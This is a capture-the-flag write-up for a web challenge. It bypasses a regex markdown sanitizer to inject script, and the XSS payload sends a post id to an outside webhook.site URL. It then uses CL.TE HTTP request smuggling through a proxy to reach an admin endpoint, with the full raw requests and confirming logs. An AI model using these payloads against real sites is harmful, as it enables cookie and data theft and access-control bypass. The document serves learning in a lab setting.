## Initial thougths

There are 4 services on:

| Port     | Service | Reachable
| -------- | ------- | ---------
| 8080     | Intial Proxy |  Accessible
| 8081     | Main app     |  Behind proxy
| 8082     | Admin app    |  Behind proxy
| 8083     | Bot          |  Accessible

To get the flag we need to send a request to Bot with some content, and the post has to get approved. If the post gets approved we get the flag.

The only way to approve a post is through the the main app, by going to `POST /api/admin/declarations/{declaration_id}/status` with some declaration id as well as a body with the status we want. To get the flag the status has to be the string "approved", as this is what the Bot endpoint compares the status with.

All services use FastAPI except the proxy which uses naja_atra, wtf is that. https://github.com/naja-atra/naja-atra, 3 stars, 0 Forks, 2 contributors. Probably trash.


To call the main app admin endpoints we need the ADMIN_API_KEY:
```py
if not admin_key or admin_key != ADMIN_API_KEY:
        raise HTTPException(
            status_code=http_status.HTTP_401_UNAUTHORIZED,
            detail="Invalid admin credentials",
        )
```

The admin app can also be used to call the main app admin endpoints, as this one automatically passes the ADMIN_API_KEY

```py
@app.post("/declarations/{declaration_id}/status")
async def admin_update_status(
    request: Request, declaration_id: str, status: str = Form(...)
):
    async with ClientSession() as session:
        response = await session.post(
            f"{MAIN_APP_URL}/api/admin/declarations/{declaration_id}/status",
            data={"status": status},
            cookies={"admin_key": ADMIN_API_KEY},
        )
```

The proxy will route us to either the main app or the admin app. If we have /admin in the url, we will get routed to the admin app. If we dont have the admin key we cant control the path.
```py
    if "/admin" in request.path:
        has_key = "admin_key" in request.cookies.keys()
        if not has_key:
            return "Missing admin key", 400

        admin_key = request.cookies.get("admin_key").value
        if admin_key == ADMIN_KEY:
            url = ADMIN_URL + request.path.replace("/admin", "") + q
        else:
            url = ADMIN_URL + "/unauthorized"
    else:
        
        url = APP_URL + request.path + q
        print(url,request.path,q)
        logging.error(url,request.path,q)
```

## What now

Lets go backwards from the flag.

1. To get the flag the bot needs an approved post
2. To approve the post we need to call the admin api
3. To call the admin api we have to pass through the proxy
4. Trash webserver for the proxy, and that there even is a proxy in the first place indicates one of the following:
    * request path can be modified
    * weird hostname modification
    * header modification
    * request smuggling
5. If we then can call the admin api we need to know what id the bot got. Either we log in as the bot to view its post, or we have to make the bot tell us what id it has somehow. The bot uses urandom(16) so logging in seems impossible.
6. We control the data for the bots post, and there is some fucky markdown sanitization and the template for delcaration_details uses {{ declaration.description | safe }} so we can probably get xss.

## Leak id

The markdown sanitization for the post description:
```py
def sanitize_markdown(markdown: str):
    sanitized = re.sub(r"<\s*\w+[^>]*>", "", markdown)
    sanitized = re.sub(r"<\s*/?\s*\w+\s*>", "", sanitized)
    return sanitized
```

We can bypass the first regex by including chars that are not \s or \w inside the tag, and only match the second tag. For example:

```html
</a>
```
This will not match the first tag, but will match the second, meaning that we can place that inside a tag we want, and once the `a` tag is removed we get our desired output.

Goal:
```html
<script>alert(1)</script>
```
Payload:
```html
<</a>script>alert(1)</</a>script>
```

We can now craft a payload to leak the id attribute of the post

```html
<</a>script>window.open('https://webhook.site/395748db-1e1d-4dce-b0b7-380171e319de?'+document.getElementById('id').innerText)</</a>script>
```

## Call admin endpoint

We can add some debug statements and open the log files for all the different endpoints to see what is going on.

### Investigate path modification

If we could send a request with a path starting with @ or . we might be able to modify the url to point to the admin url without knowing the admin_key, because of the code in proxy that looks like this:

```py
url = APP_URL + request.path + q
```

However, even a request like `GET @asd HTTP/1.1` seems to have a `/` added before it so that doesnt work.

### Investigate hostname modification

This thing doesnt give a shit about the hostname and doesnt even follow the RFC, so this is a bust.

### Investigate header modification

No headers seem to really matter, except cookies where admin_key routes us to `/unauthorized`.

### Investigate request smuggling

If we can get a request through the proxy to the admin app we can call any endpoint we want as the admin app will pass along the admin_key for us. 

I used `tail -f /var/log/supervisor/app_out.log` to see what was hitting the main app and copy pasted the CL.TE vulnerabilities paylaod from burp https://portswigger.net/web-security/request-smuggling#how-to-perform-an-http-request-smuggling-attack

```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 115
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The log shows two entries for the request, with the same source port, so we have smuggling confirmed:
```
INFO:     127.0.0.1:53942 - "POST / HTTP/1.1" 405 Method Not Allowed
INFO:     127.0.0.1:53942 - "POST / HTTP/1.1" 405 Method Not Allowed
```

Works against admin too:

```
POST /admin HTTP/1.1
Cookie: admin_key=a
Host: vulnerable-website.com
Content-Length: 118
Transfer-Encoding: chunked

0

POST /asd HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Log:
```
INFO:     127.0.0.1:55752 - "POST /unauthorized HTTP/1.1" 405 Method Not Allowed
INFO:     127.0.0.1:55752 - "POST /asd HTTP/1.1" 404 Not Found
```

Did not even remove the "update content-length" thing in burp.

However when I add `Content-Type: application/x-www-form-urlencoded` the smuggling doesnt work anymore???

idk struggeled a bit here, but got it to work with. The second request did not show in the logs when it succeded for some reason, so got a bit stuck when I actually had a working payload without realising it.

```
POST /admin HTTP/1.1
Host: vulnerable-website.com
Cookie: admin_key=a
Content-Length: 198
Transfer-Encoding: chunked

0

POST /declarations/c4527e2a-8517-4cf1-81d4-6d0c253f0fa4/status HTTP/1.1
Host: vulnerable-website.com
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

status=approved

```

## Solve

1. Send bot post with xss
2. Get id
3. Send smuggled request setting status=approved
4. Get flag

see solve.py

